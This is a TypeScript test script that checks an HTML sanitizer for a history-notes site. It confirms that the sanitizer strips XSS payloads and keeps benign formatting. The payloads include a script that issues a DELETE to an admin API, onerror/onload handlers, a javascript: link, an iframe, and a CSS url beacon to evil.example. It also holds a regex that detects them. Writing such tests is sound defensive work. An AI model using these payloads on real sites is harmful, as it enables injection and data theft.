import { sanitizeNoteHtml } from '../lib/sanitizeNoteHtml';

let fails = 0;
const blocks = (name: string, payload: string) => {
  const out = sanitizeNoteHtml(payload);
  const bad = /<script|<iframe|<object|<embed|\son[a-z]+\s*=|javascript:/i.test(out);
  if (bad) fails++;
  console.log(`  ${bad ? 'FAIL' : 'PASS'}  ${name}`);
  if (bad) console.log(`        -> ${out}`);
};
const keeps = (name: string, payload: string, must: string) => {
  const out = sanitizeNoteHtml(payload);
  const ok = out.includes(must);
  if (!ok) fails++;
  console.log(`  ${ok ? 'PASS' : 'FAIL'}  ${name}`);
  if (!ok) console.log(`        got: ${out}`);
};

console.log('\nblocks injection in admin-authored overrides');
blocks('script tag', '<p>Akbar</p><script>fetch("/api/admin/blog-posts",{method:"DELETE"})</script>');
blocks('unquoted handler', '<img src=x onerror=alert(1)>');
blocks('svg onload', '<svg/onload=alert(1)>');
blocks('javascript: link', '<a href="javascript:alert(1)">Mansabdari</a>');
blocks('iframe', '<iframe src="https://evil.example"></iframe>');
blocks('style-based exfiltration', '<div style="background:url(https://evil.example/?c=x)">x</div>');
blocks('script content not left as text', '<script>alert(1)</script>');

console.log('\npreserves what the corpus actually uses');
keeps('headings with TOC ids', '<h2 id="toc-0-sources">Sources</h2>', 'id="toc-0-sources"');
keeps('bold', '<p>The <strong>Mauryan</strong> state.</p>', '<strong>Mauryan</strong>');
keeps('list indent style', '<li style="padding-left:2em">Vedas</li>', 'padding-left:2em');
keeps('highlight mark', '<mark class="hl-yellow">iqta</mark>', 'class="hl-yellow"');
keeps('tables', '<table><tbody><tr><td>Akbar</td></tr></tbody></table>', '<td>Akbar</td>');
// Entities are decoded to their character: &#8226; becomes • (both U+2022),
// which renders identically. Assert the character, not the encoding.
keeps('bullet entity survives as its character', '<li>&#8226; Vedic literature</li>', '\u2022');
keeps('ampersand stays escaped', '<p>Salt &amp; Satyagraha</p>', '&amp;');
keeps('safe external link', '<a href="https://example.com">x</a>', 'href="https://example.com"');
keeps('inline image', '<img src="https://example.com/map.png" alt="map">', 'src="https://example.com/map.png"');

const rel = sanitizeNoteHtml('<a href="https://example.com" target="_blank">x</a>');
const relOk = rel.includes('rel="noopener noreferrer"');
if (!relOk) fails++;
console.log(`  ${relOk ? 'PASS' : 'FAIL'}  target=_blank gets rel=noopener`);

console.log(`\n${fails === 0 ? 'ALL PASS' : fails + ' FAILED'}`);
process.exit(fails === 0 ? 0 : 1);
